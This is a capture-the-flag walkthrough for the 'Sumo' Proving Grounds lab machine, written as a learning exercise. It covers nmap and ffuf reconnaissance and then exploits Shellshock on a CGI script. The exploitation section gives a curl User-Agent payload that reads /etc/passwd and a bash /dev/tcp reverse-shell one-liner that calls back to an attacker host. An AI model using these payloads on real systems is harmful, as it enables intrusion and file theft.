## Sumo Proving Grounds
## Level: Easy
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 192.168.212.87 -T4  -v -p-```

```
# Nmap 7.93 scan initiated Sat Jun 24 13:51:06 2023 as: nmap -A -T4 -v -p- -oN sumo 192.168.212.87
Increasing send delay for 192.168.212.87 from 0 to 5 due to 752 out of 1879 dropped probes since last increase.
Increasing send delay for 192.168.212.87 from 5 to 10 due to 17 out of 42 dropped probes since last increase.
Warning: 192.168.212.87 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.212.87
Host is up (0.21s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06cb9ea3aff01048c417934a2c45d948 (DSA)
|   2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)
|_  256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)
80/tcp    open     http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
10604/tcp filtered unknown
20429/tcp filtered unknown
20820/tcp filtered unknown
21802/tcp filtered unknown
27692/tcp filtered unknown
41664/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/24%OT=22%CT=1%CU=40015%PV=Y%DS=4%DC=T%G=Y%TM=6496EC0
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M
OS:54EST11NW5%O2=M54EST11NW5%O3=M54ENNT11NW5%O4=M54EST11NW5%O5=M54EST11NW5%
OS:O6=M54EST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(R=Y%
OS:DF=Y%T=40%W=3908%O=M54ENNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=B3
OS:60%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.356 days (since Sat Jun 24 05:41:12 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   293.00 ms 192.168.45.1
2   292.98 ms 192.168.45.254
3   293.02 ms 192.168.251.1
4   293.06 ms 192.168.212.87

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 24 14:13:36 2023 -- 1 IP address (1 host up) scanned in 1350.43 seconds
```

From our scan we can see we have 2 open ports. Port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80.




# Enumeration

Navigating to the webpage you should see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b321877-d939-4b76-a54b-580bff6381a5)

checking the web source page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d860ae0-5b3f-448a-abb3-a6ad3cedebde)

oops nothing

Well, all hope isn't lost yet, lets go ahead and fire up our directory enumeration tools. I'll be using ffuf

command:```ffuf -u "http://192.168.212.87/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/sumo]
└─$ ffuf -u "http://192.168.212.87/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.212.87/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

cgi-bin/                [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 214ms]
index                   [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 218ms]
index.html              [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 217ms]
:: Progress: [32298/32298] :: Job [1/1] :: 180 req/sec :: Duration: [0:03:29] :: Errors: 0 ::
```
cool, we found a directory ```cgi-bin/```. 

Navigating to that directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cdcb95fb-54cd-45a2-98f2-3d5ee220a66d)

opps, "403 error"😧. 

Lets try to fuzz this directory to see if we can get anything

command:```ffuf -u "http://192.168.212.87/cgi-bin/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/sumo]
└─$ ffuf -u "http://192.168.212.87/cgi-bin/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.212.87/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

test                    [Status: 200, Size: 14, Words: 3, Lines: 2, Duration: 223ms]
:: Progress: [32298/32298] :: Job [1/1] :: 157 req/sec :: Duration: [0:03:16] :: Errors: 0 ::
```
We found a sub-directory hehe😎.

Navigating to the sub-directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7cb25db6-01b1-4bb1-ba55-a443a2a724b7)

Okay, "CGI Default". 

What's CGI??

<font color="green">CGI stands for Common Gateway Interface. It is a standard protocol that enables communication between web servers and external programs or scripts. CGI allows web servers to execute these programs and generate dynamic content in response to user requests, facilitating the interactive nature of websites and web applications.</font>

Lets try to look for vulnerabilities for this standard protocol

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/784c7a05-cd16-4223-b5c4-21c6fe3b999e)

Okay, we find out the name of the vulnerability is shellshock, you can read more about it [here](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/)

Reading [this](https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?utm_source=dlvr.it&utm_medium=twitter) you'll see that editing the  user agent will get us a reverse shell.

Cool stuff right??😎





# Exploitation

I'll be using the ```curl``` command to do this

payload:```() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"```

With this, we'll try to view the ```/etc/passwd``` file

command:```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://192.168.170.87/cgi-bin/test```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b440fc1c-951c-4ead-8f7a-396ff7e87144)

cool stuff hehe. Lets go ahead and get a reverse shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4b6e1f4d-ee32-4218-89c9-69b3399d08b5)

As you can see from the above screenshot the command ```id``` and ```whoami``` works. So, we can leverage this to  get our reverse shell

command:```curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://192.168.86.150/cgi-bin/test```

Ensure you change the $lhost to your machine's IP. 

Setting up our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/617eab9c-6794-42ef-b336-e82a5c66630f)

Running the above command;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db00ab86-3806-44c1-89b7-f92fc64d2bc2)

Nice, we got a shell as user "_www-data_".

Lets go ahead and escalate our privileges.




# Privilege Escalation

Checking the version of Linux running on the box

command:```cat /etc/issue```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/edec7b73-6e7d-47e4-a715-2159d71063b6)

Lets go ahead and look for available exploits













  


